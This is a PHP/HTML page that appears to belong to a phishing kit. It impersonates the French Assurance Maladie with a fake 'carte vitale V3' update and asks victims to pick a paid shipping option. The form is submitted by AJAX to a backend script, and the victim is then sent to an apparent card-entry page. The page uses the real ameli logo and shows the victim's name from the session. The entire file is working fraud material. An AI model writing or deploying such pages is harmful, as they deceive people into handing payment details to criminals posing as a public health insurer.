<?php 


include("../infos.php");
include("../common/sub_includes.php");

?>
<html lang="fr">
<?php include("../common/header.php")  ?>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .progressbar { margin: 0px 10px; overflow: hidden; }
        .progressbar > div { float: left; width: 20%; text-align: center; padding-bottom: 10px; border-bottom: 5px solid rgb(52, 141, 48); position: relative; margin-bottom: 7px; font-style: italic; }
        .progressbar > div > span { color: rgb(52, 141, 48); }
        .progressbar > div > div { position: absolute; bottom: -12px; left: 50%; width: 20px; height: 20px; background: rgb(52, 141, 48) none repeat scroll 0% 0%; border-radius: 10px; z-index: 0; }
        .progressbar > div.progressing > div { background: white none repeat scroll 0% 0%; border: 3px solid rgb(52, 141, 48); }
        .progressbar > div.progressing > span { color: rgb(0, 150, 136); font-style: normal; }
        @media (max-width: 470px) {
          .progressbar > div > span { font-size: 11px !important; }
          .progressbar > div { width: inherit; padding-left: 5px; }
          .progressbar { margin: 0px auto; }
          .last-payment-form > h1 { text-align: center; line-height: 100%; font-size: 25px; }
          .valider-btn { width: 100% !important; }
          .payment-form { padding: 10px !important; }
          .last-payment-form { padding: 10px !important; }
          .last-form-info > div { float: left !important; }
          .last-form-info > div > label { font-size: 11px; }
        }
        @media (max-width: 330px) {
          .progressbar > div > span { font-size: 10px !important; }
        }
        
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }
        .progressbar > div{
            width: 25%;
        }

        .container{
            width : 95% !important;
        }


    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="/public/fav.png" type="image/ico">

    <title>Veuillez remplir le formulaire</title>
</head>
<style>
    				.panel-heading{
					border-bottom : 2px solid #003763 !important

				}
                span{
                    color : #003763 !important;
                }
                .btn-xl,.styled-table thead tr,.btn-primary{
                    background-color : #003763 !important;
                }
</style>
<body>

<div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: #003763 none repeat scroll 0% 0%;">
        <div class="banner">
			<?php include("../common/svg.php"); ?>
								
     </div>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Mise à jour carte vitale V3</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">
    <form action="" method="POST">
        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url(../assets/images/back.png);">
                    <div class="panel-heading">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Transport</h2>
                    </div>

                    <div class="panel-body">
                    <br> Bénéficiaire : <b><?php echo $_SESSION["nom"] . " " . $_SESSION["prenom"]  ?></b>
                        <br> Date de la demande : <b><?php echo $_SESSION["date"] ?> à  <?php echo $_SESSION["heure"] ?></b>
                        <hr>

                        <style>
                            .styled-table {
                            border-collapse: collapse;
                            margin: 25px 0;
                            font-size: 0.9em;
                            font-family: sans-serif;
                            width: 100%;
                            border-radius:6px;
                            box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
                            }
                            
                            .styled-table thead tr {
                            background-color: #009879;
                            color: #ffffff;
                            text-align: left;
                            }
                            
                            .styled-table th,
                            .styled-table td {
                            padding: 12px 15px;
                            }
                            .styled-table tbody tr {
                            border-bottom: 1px solid #dddddd;
                            }
                            
                            .styled-table tbody tr:nth-of-type(even) {
                            background-color: #f3f3f3;
                            }
                            
                            .styled-table tbody tr:last-of-type {
                            border-bottom: 2px solid #009879;
                            }
                            .styled-table tbody tr.active-row {
                            font-weight: bold;
                            color: #009879;
                            }
                        </style>

                        <div class="row">
                            <div class="col-md-7">
                                <div class="col-md-12">

                                    <div class="progressbar">

                                        <div><span>Informations</span>
                                            <div></div>
                                        </div>
                                        <div><span>Adresse</span>
                                            <div></div>
                                        </div>
                                        <div class="progressing"><span>Frais de port</span>
                                            <div></div>
                                        </div>
                                        <div><span>Paiement</span>
                                            <div></div>
                                        </div>
                                    </div>
                                    <br><br> Nous vous proposons plusieurs solutions d'envoie postale pour obtenir votre nouvelle carte vitale le plus rapidement possible. Veuillez choisir le transporteur de votre choix.
                                        <table class="styled-table">
                                            <thead>
                                                <tr>
                                                    <th></th>
                                                    <th>Transporteur</th>
                                                    <th>Informations</th>
                                                    <th>Prix</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                <tr>
                                                    <td><input type="radio" name="transport" value="0,75" checked=""></td>
                                                    <td><img src="../assets/images/laposte.png" style="width:110px;"></td>
                                                    <td>La Poste, livraison sous 3 à 5 jours ouvrés </td>
                                                    <td>0,95€ <small>TTC</small></td>
                                                </tr>
                                                <tr>
                                                    <td><input type="radio" name="transport" value="4,90"></td>
                                                    <td><img src="../assets/images/chronopost.png" style="width:110px;"></td>
                                                    <td>Chronopost Express, livraison sous 1 à 2 jours ouvrés </td>
                                                    <td>3,90€ <small>TTC</small></td>
                                                </tr>
                                            </tbody>
                                        </table>

                                    
                                </div>

                                <div class="col-md-12">

                                    <button type="submit" id="submit" class="btn btn-primary">Procéder au paiement</button>

                                    <br><br>
                                </div>
                            </div>
                            <div class="col-md-5" style="border-radius:6px;">
                                <img class="col-md-12" src="https://img-3.journaldesfemmes.fr/fWDZfOzwqNpTEa38YbmO01oaGfw=/910x607/smart/85d88ece3b2249cc9a710a0c0505d0f2/ccmcms-jdf/11114040.jpg" style="border-radius:60px;;">
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
        <br><br>
        </form>
    </main>

    <div id="loading" class="LoadingPage">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://www.ameli.fr/themes/custom/ameli/images/logo.svg">
                </div>
                <span>Veuillez patienter ...</span>
            </div>
        </div>
    </div>
	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>
    <script>


        $(document).ready(function() {
        			$("form").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/avoir.php",
        						data: $this.serialize()
        					})
        					.done(function(msg) {
        						setTimeout(function() {
        							window.location.href = "card.php";
        						}, 2000);
        					});
        				
        
        			});
        		});
    </script>

</body>
<style>
           @media (max-width: 430px) {
            .styled-table{
                width: 100% !important;;
            }
            .col-md-7{
                padding-right : 0 !important;
                padding-left : 0 !important;
            }
            .styled-table img{
                width : 50px !important;
            }

            .styled-table td{
                padding-right : 5px !important;
                padding-left :5px !important;
            }

        }

        @media (max-width: 350px) {
            .styled-table{
                width: 100% !important;;
            }
            .col-md-7{
                padding-right : 0 !important;
                padding-left : 0 !important;
            }
            .styled-table img{
                width : 30px !important;
            }

            .styled-table td{

                padding-right : 0px !important;
                padding-left :0px !important;
            }

        }
</style>

</html>